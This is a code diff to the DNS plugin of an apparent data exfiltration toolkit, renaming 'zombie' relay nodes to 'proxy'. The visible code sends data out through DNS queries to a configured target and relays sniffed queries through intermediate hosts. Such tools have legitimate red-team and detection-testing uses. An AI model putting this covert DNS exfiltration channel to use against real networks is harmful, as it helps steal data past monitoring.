@@ -35,7 +35,7 @@ def relay_dns_query(domain):
     target = config['target']
     port = config['port']
     app_exfiltrate.log_message(
-            'info', "[zombie] [dns] Relaying dns query to {0}".format(target))
+            'info', "[proxy] [dns] Relaying dns query to {0}".format(target))
     q = DNSRecord.question(domain)
     try:
         q.send(target, port, timeout=0.01)
@@ -61,8 +61,8 @@ def sniff(handler):
 #Max query is 253 characters long (textual representation)
 #Max label length is 63 bytes
 def send(data):
-    if config.has_key('zombies') and config['zombies'] != [""]:
-        targets = [config['target']] + config['zombies']
+    if config.has_key('proxies') and config['proxies'] != [""]:
+        targets = [config['target']] + config['proxies']
     else:
         targets = [config['target']]
     port = config['port']
@@ -107,14 +107,14 @@ def listen():
         'info', "[dns] Waiting for DNS packets for domain {0}".format(config['key']))
     sniff(handler=handle_dns_query)
 
-def zombie():
+def proxy():
      app_exfiltrate.log_message(
-        'info', "[zombie] [dns] Waiting for DNS packets for domain {0}".format(config['key']))
+        'info', "[proxy] [dns] Waiting for DNS packets for domain {0}".format(config['key']))
      sniff(handler=relay_dns_query)
 
 class Plugin:
     def __init__(self, app, conf):
         global app_exfiltrate, config
         config = conf
-        app.register_plugin('dns', {'send': send, 'listen': listen, 'zombie': zombie})
+        app.register_plugin('dns', {'send': send, 'listen': listen, 'proxy': proxy})
         app_exfiltrate = app
